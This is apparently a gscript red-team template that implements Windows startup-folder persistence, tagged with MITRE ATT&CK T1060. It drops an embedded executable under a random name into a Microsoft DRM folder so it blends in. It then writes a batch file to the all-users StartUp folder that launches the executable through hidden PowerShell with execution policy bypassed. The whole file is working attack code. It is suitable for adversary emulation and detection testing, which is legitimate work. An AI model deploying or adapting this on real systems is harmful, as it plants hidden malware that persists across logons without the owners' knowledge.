// Example gscript template
// Title: Startup Persistence
// Author: ahhh
// Purpose: Drop a sample binary and persist it using a script in the Startup folder
// Gscript version: 0.1.1
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1060

//priority:90
//timeout:150
//import:/private/tmp/example.exe

var fn;

function BeforeDeploy() {
  LogInfo("starting execution of Startup Persistence");
  return true; 
}

function Deploy() {
  // Drop the sample
  var example = Asset("example.exe");
  var name = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < 3; i++)
    name += possible.charAt(Math.floor(Math.random() * possible.length));
  fn = "C:\\ProgramData\\Microsoft\\DRM\\" + name + ".exe";
  WriteFile(fn, example.fileData, 0755);
  LogInfo("dropped the example binary here: "+fn);
  
  // Persist the sample
  var cmd = "powershell.exe -NoLogo -WindowStyle hidden -ep bypass " + fn;
  fn2 = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\start.bat";
  WriteFile(fn2, StringToByteArray(cmd), 0755);
  LogInfo("persisted the example binary using bat / powershell script in StartUp folder");

  // Execute the sample
  //ForkExecuteCommand("powershell", ["-NoLogo", "-WindowStyle", "hidden", "-ep", "bypass", fn]);
  //LogInfo("executed the example binary");
  return true;
}

function AfterDeploy() {
  LogInfo("done, deployed binary with startup persistence");
  return true;
}
